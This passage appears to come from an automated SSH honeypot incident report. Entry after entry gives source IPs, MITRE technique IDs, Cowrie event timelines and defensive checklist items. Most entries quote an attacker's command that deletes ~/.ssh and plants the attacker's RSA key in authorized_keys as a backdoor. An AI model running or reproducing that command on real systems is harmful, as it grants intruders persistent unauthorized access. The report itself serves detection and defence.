| **First Seen** | 2026-04-14 07:19 |
| **Last Seen** | 2026-04-14 07:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 07:19:00` | `cowrie.session.connect` |
| `2026-04-14 07:19:00` | `cowrie.client.version` |
| `2026-04-14 07:19:00` | `cowrie.client.kex` |
| `2026-04-14 07:19:01` | `cowrie.login.success` |
| `2026-04-14 07:19:01` | `cowrie.session.params` |
| `2026-04-14 07:19:01` | `cowrie.command.input` |
| `2026-04-14 07:19:01` | `cowrie.command.failed` |
| `2026-04-14 07:19:01` | `cowrie.log.closed` |
| `2026-04-14 07:19:02` | `cowrie.session.params` |
| `2026-04-14 07:19:02` | `cowrie.command.input` |
| `2026-04-14 07:19:02` | `cowrie.session.file_download` |
| `2026-04-14 07:19:02` | `cowrie.log.closed` |
| `2026-04-14 07:19:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.13[.]156` to AbuseIPDB if not already reported
- [ ] Block `213.225.13[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80ed85813111

| Field | Detail |
|---|---|
| **Source IP** | `213.225.13[.]156` |
| **First Seen** | 2026-04-14 07:19 |
| **Last Seen** | 2026-04-14 07:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 07:19:04` | `cowrie.session.connect` |
| `2026-04-14 07:19:04` | `cowrie.client.version` |
| `2026-04-14 07:19:05` | `cowrie.client.kex` |
| `2026-04-14 07:19:05` | `cowrie.login.success` |
| `2026-04-14 07:19:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.13[.]156` to AbuseIPDB if not already reported
- [ ] Block `213.225.13[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e3ea77385f0

| Field | Detail |
|---|---|
| **Source IP** | `213.225.13[.]156` |
| **First Seen** | 2026-04-14 07:23 |
| **Last Seen** | 2026-04-14 07:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 07:23:03` | `cowrie.session.connect` |
| `2026-04-14 07:23:03` | `cowrie.client.version` |
| `2026-04-14 07:23:03` | `cowrie.client.kex` |
| `2026-04-14 07:23:04` | `cowrie.login.success` |
| `2026-04-14 07:23:04` | `cowrie.session.params` |
| `2026-04-14 07:23:04` | `cowrie.command.input` |
| `2026-04-14 07:23:04` | `cowrie.command.failed` |
| `2026-04-14 07:23:04` | `cowrie.log.closed` |
| `2026-04-14 07:23:05` | `cowrie.session.params` |
| `2026-04-14 07:23:05` | `cowrie.command.input` |
| `2026-04-14 07:23:05` | `cowrie.session.file_download` |
| `2026-04-14 07:23:05` | `cowrie.log.closed` |
| `2026-04-14 07:23:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.13[.]156` to AbuseIPDB if not already reported
- [ ] Block `213.225.13[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cef75eff99e7

| Field | Detail |
|---|---|
| **Source IP** | `213.225.13[.]156` |
| **First Seen** | 2026-04-14 07:23 |
| **Last Seen** | 2026-04-14 07:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 07:23:07` | `cowrie.session.connect` |
| `2026-04-14 07:23:07` | `cowrie.client.version` |
| `2026-04-14 07:23:08` | `cowrie.client.kex` |
| `2026-04-14 07:23:08` | `cowrie.login.success` |
| `2026-04-14 07:23:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.13[.]156` to AbuseIPDB if not already reported
- [ ] Block `213.225.13[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc815a7c9a72

| Field | Detail |
|---|---|
| **Source IP** | `213.225.13[.]156` |
| **First Seen** | 2026-04-14 07:24 |
| **Last Seen** | 2026-04-14 07:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 07:24:31` | `cowrie.session.connect` |
| `2026-04-14 07:24:31` | `cowrie.client.version` |
| `2026-04-14 07:24:31` | `cowrie.client.kex` |
| `2026-04-14 07:24:32` | `cowrie.login.success` |
| `2026-04-14 07:24:32` | `cowrie.session.params` |
| `2026-04-14 07:24:32` | `cowrie.command.input` |
| `2026-04-14 07:24:32` | `cowrie.command.failed` |
| `2026-04-14 07:24:33` | `cowrie.log.closed` |
| `2026-04-14 07:24:33` | `cowrie.session.params` |
| `2026-04-14 07:24:33` | `cowrie.command.input` |
| `2026-04-14 07:24:33` | `cowrie.session.file_download` |
| `2026-04-14 07:24:33` | `cowrie.log.closed` |
| `2026-04-14 07:24:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.13[.]156` to AbuseIPDB if not already reported
- [ ] Block `213.225.13[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2b5f54e9da0

| Field | Detail |
|---|---|
| **Source IP** | `213.225.13[.]156` |
| **First Seen** | 2026-04-14 07:24 |
| **Last Seen** | 2026-04-14 07:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 07:24:35` | `cowrie.session.connect` |
| `2026-04-14 07:24:35` | `cowrie.client.version` |
| `2026-04-14 07:24:36` | `cowrie.client.kex` |
| `2026-04-14 07:24:36` | `cowrie.login.success` |
| `2026-04-14 07:24:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.13[.]156` to AbuseIPDB if not already reported
- [ ] Block `213.225.13[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e92d16993f2c

| Field | Detail |
|---|---|
| **Source IP** | `171.231.184[.]15` |
| **First Seen** | 2026-04-14 07:47 |
| **Last Seen** | 2026-04-14 07:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 07:47:15` | `cowrie.session.connect` |
| `2026-04-14 07:47:15` | `cowrie.client.version` |
| `2026-04-14 07:47:15` | `cowrie.client.kex` |
| `2026-04-14 07:47:16` | `cowrie.login.success` |
| `2026-04-14 07:47:16` | `cowrie.direct-tcpip.request` |
| `2026-04-14 07:47:16` | `cowrie.direct-tcpip.ja4h` |
| `2026-04-14 07:47:16` | `cowrie.direct-tcpip.data` |
| `2026-04-14 07:47:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.184[.]15` to AbuseIPDB if not already reported
- [ ] Block `171.231.184[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6579f3a0c870

| Field | Detail |
|---|---|
| **Source IP** | `122.176.122[.]24` |
| **First Seen** | 2026-04-14 08:20 |
| **Last Seen** | 2026-04-14 08:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:20:54` | `cowrie.session.connect` |
| `2026-04-14 08:20:54` | `cowrie.client.version` |
| `2026-04-14 08:20:54` | `cowrie.client.kex` |
| `2026-04-14 08:20:54` | `cowrie.login.success` |
| `2026-04-14 08:20:54` | `cowrie.session.params` |
| `2026-04-14 08:20:54` | `cowrie.command.input` |
| `2026-04-14 08:20:54` | `cowrie.command.failed` |
| `2026-04-14 08:20:54` | `cowrie.log.closed` |
| `2026-04-14 08:20:54` | `cowrie.session.params` |
| `2026-04-14 08:20:54` | `cowrie.command.input` |
| `2026-04-14 08:20:54` | `cowrie.session.file_download` |
| `2026-04-14 08:20:54` | `cowrie.log.closed` |
| `2026-04-14 08:20:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.176.122[.]24` to AbuseIPDB if not already reported
- [ ] Block `122.176.122[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf2a827d1d1d

| Field | Detail |
|---|---|
| **Source IP** | `122.176.122[.]24` |
| **First Seen** | 2026-04-14 08:20 |
| **Last Seen** | 2026-04-14 08:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:20:56` | `cowrie.session.connect` |
| `2026-04-14 08:20:56` | `cowrie.client.version` |
| `2026-04-14 08:20:56` | `cowrie.client.kex` |
| `2026-04-14 08:20:56` | `cowrie.login.success` |
| `2026-04-14 08:20:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.176.122[.]24` to AbuseIPDB if not already reported
- [ ] Block `122.176.122[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91aac348dade

| Field | Detail |
|---|---|
| **Source IP** | `220.118.173[.]234` |
| **First Seen** | 2026-04-14 08:24 |
| **Last Seen** | 2026-04-14 08:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:24:33` | `cowrie.session.connect` |
| `2026-04-14 08:24:33` | `cowrie.client.version` |
| `2026-04-14 08:24:33` | `cowrie.client.kex` |
| `2026-04-14 08:24:34` | `cowrie.login.success` |
| `2026-04-14 08:24:34` | `cowrie.session.params` |
| `2026-04-14 08:24:34` | `cowrie.command.input` |
| `2026-04-14 08:24:34` | `cowrie.command.failed` |
| `2026-04-14 08:24:34` | `cowrie.log.closed` |
| `2026-04-14 08:24:34` | `cowrie.session.params` |
| `2026-04-14 08:24:34` | `cowrie.command.input` |
| `2026-04-14 08:24:35` | `cowrie.session.file_download` |
| `2026-04-14 08:24:35` | `cowrie.log.closed` |
| `2026-04-14 08:24:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.118.173[.]234` to AbuseIPDB if not already reported
- [ ] Block `220.118.173[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a407167a080

| Field | Detail |
|---|---|
| **Source IP** | `220.118.173[.]234` |
| **First Seen** | 2026-04-14 08:24 |
| **Last Seen** | 2026-04-14 08:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:24:37` | `cowrie.session.connect` |
| `2026-04-14 08:24:37` | `cowrie.client.version` |
| `2026-04-14 08:24:37` | `cowrie.client.kex` |
| `2026-04-14 08:24:37` | `cowrie.login.success` |
| `2026-04-14 08:24:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.118.173[.]234` to AbuseIPDB if not already reported
- [ ] Block `220.118.173[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9edba63a20cd

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-04-14 08:25 |
| **Last Seen** | 2026-04-14 08:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:25:34` | `cowrie.session.connect` |
| `2026-04-14 08:25:34` | `cowrie.client.version` |
| `2026-04-14 08:25:35` | `cowrie.client.kex` |
| `2026-04-14 08:25:35` | `cowrie.login.success` |
| `2026-04-14 08:25:35` | `cowrie.session.params` |
| `2026-04-14 08:25:35` | `cowrie.command.input` |
| `2026-04-14 08:25:35` | `cowrie.command.failed` |
| `2026-04-14 08:25:36` | `cowrie.log.closed` |
| `2026-04-14 08:25:36` | `cowrie.session.params` |
| `2026-04-14 08:25:36` | `cowrie.command.input` |
| `2026-04-14 08:25:36` | `cowrie.session.file_download` |
| `2026-04-14 08:25:36` | `cowrie.log.closed` |
| `2026-04-14 08:25:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a3e80fef86a

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-04-14 08:25 |
| **Last Seen** | 2026-04-14 08:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:25:38` | `cowrie.session.connect` |
| `2026-04-14 08:25:38` | `cowrie.client.version` |
| `2026-04-14 08:25:38` | `cowrie.client.kex` |
| `2026-04-14 08:25:39` | `cowrie.login.success` |
| `2026-04-14 08:25:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf96b4b4a079

| Field | Detail |
|---|---|
| **Source IP** | `107.175.34[.]74` |
| **First Seen** | 2026-04-14 08:26 |
| **Last Seen** | 2026-04-14 08:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:26:17` | `cowrie.session.connect` |
| `2026-04-14 08:26:17` | `cowrie.client.version` |
| `2026-04-14 08:26:18` | `cowrie.client.kex` |
| `2026-04-14 08:26:19` | `cowrie.login.success` |
| `2026-04-14 08:26:19` | `cowrie.session.params` |
| `2026-04-14 08:26:19` | `cowrie.command.input` |
| `2026-04-14 08:26:19` | `cowrie.command.failed` |
| `2026-04-14 08:26:19` | `cowrie.log.closed` |
| `2026-04-14 08:26:20` | `cowrie.session.params` |
| `2026-04-14 08:26:20` | `cowrie.command.input` |
| `2026-04-14 08:26:20` | `cowrie.session.file_download` |
| `2026-04-14 08:26:20` | `cowrie.log.closed` |
| `2026-04-14 08:26:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.175.34[.]74` to AbuseIPDB if not already reported
- [ ] Block `107.175.34[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af0b05165b35

| Field | Detail |
|---|---|
| **Source IP** | `107.175.34[.]74` |
| **First Seen** | 2026-04-14 08:26 |
| **Last Seen** | 2026-04-14 08:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:26:23` | `cowrie.session.connect` |
| `2026-04-14 08:26:23` | `cowrie.client.version` |
| `2026-04-14 08:26:23` | `cowrie.client.kex` |
| `2026-04-14 08:26:24` | `cowrie.login.success` |
| `2026-04-14 08:26:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.175.34[.]74` to AbuseIPDB if not already reported
- [ ] Block `107.175.34[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92375249a9bb

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-04-14 08:27 |
| **Last Seen** | 2026-04-14 08:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:27:23` | `cowrie.session.connect` |
| `2026-04-14 08:27:23` | `cowrie.client.version` |
| `2026-04-14 08:27:24` | `cowrie.client.kex` |
| `2026-04-14 08:27:24` | `cowrie.login.success` |
| `2026-04-14 08:27:24` | `cowrie.session.params` |
| `2026-04-14 08:27:24` | `cowrie.command.input` |
| `2026-04-14 08:27:24` | `cowrie.command.failed` |
| `2026-04-14 08:27:25` | `cowrie.log.closed` |
| `2026-04-14 08:27:25` | `cowrie.session.params` |
| `2026-04-14 08:27:25` | `cowrie.command.input` |
| `2026-04-14 08:27:25` | `cowrie.session.file_download` |
| `2026-04-14 08:27:25` | `cowrie.log.closed` |
| `2026-04-14 08:27:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81ae51bb1917

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-04-14 08:27 |
| **Last Seen** | 2026-04-14 08:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:27:27` | `cowrie.session.connect` |
| `2026-04-14 08:27:27` | `cowrie.client.version` |
| `2026-04-14 08:27:27` | `cowrie.client.kex` |
| `2026-04-14 08:27:28` | `cowrie.login.success` |
| `2026-04-14 08:27:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-962429c198ba

| Field | Detail |
|---|---|
| **Source IP** | `107.175.34[.]74` |
| **First Seen** | 2026-04-14 08:27 |
| **Last Seen** | 2026-04-14 08:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
